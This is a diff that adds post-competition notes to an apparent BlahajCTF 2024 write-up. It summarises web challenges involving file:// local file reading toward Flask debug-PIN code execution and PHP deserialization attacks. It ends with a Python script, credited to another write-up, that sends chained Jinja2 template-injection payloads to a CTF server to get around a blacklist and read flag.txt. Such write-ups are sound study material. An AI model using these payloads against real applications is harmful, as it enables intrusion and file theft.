@@ -308,3 +308,32 @@ Honestly, I did not find this challenge fun as it was quite guessy.
 TODO
 ## Data compressor
 TODO
+# Post ctf lessons
+Official solutions at https://github.com/blahajctf/blahajctf24-public
+## Screenshooter
+We are given LFI by by means of screenshots using the `file://` protocol. Use that to leak information to construct flask debug pin for RCE.
+## Process killer panel
+Php deserialize RCE(Or a POP chain?). https://book.hacktricks.xyz/pentesting-web/deserialization#php
+Vulnerability comes from `MainClass::importProcesses()` which uses `unserialize` on user data.
+## User management system
+I don't quite understand but it is something to do with invalid string size being stored when strings are replaced from `chr(0)+"*"+chr(0)`(Prefix to php protected fields?) to `\0\0\0`  to be stored in a db and the reverse happening when unserializing, leading to the object being unserialized incorrectly? https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/  
+## SSTI Golf
+https://rwandi-ctf.github.io/BlahajCTF2024/SSTI-Golf/
+A SSTI challenge with blacklisted terms and a string length restriction. The `config` variable is not blacklisted and we can split up and persist our payloads through it.
+```python
+import requests
+payloads = [
+    '{{config.update({"u":config.update})}}', #we are storing the config.update() method into a config variable itself to minimise characters 
+    '{{config.u({"a":"".__class__.mro()})}}', #the next few lines just breaks up the payload into multiple parts and stores them into config vars
+    '{{config.u({"b":"__subclasses__"})}}',
+    '{{config.u({"c":config.a[1]})}}',
+    '{{config.u({"d":config.c[config.b]})}}',
+    '{{config.u({"e":config.d()[357]})}}',
+    "{{config.e('flag.txt').read()}}" ## calling read() on the initialised LazyFile class
+]
+
+for i in payloads:
+    resp=requests.post("http://golf.c1.blahaj.sg/greet",data={"comment":i})
+    print(resp.content)
+```
+Code taken directly from the writeup above, full credits to them
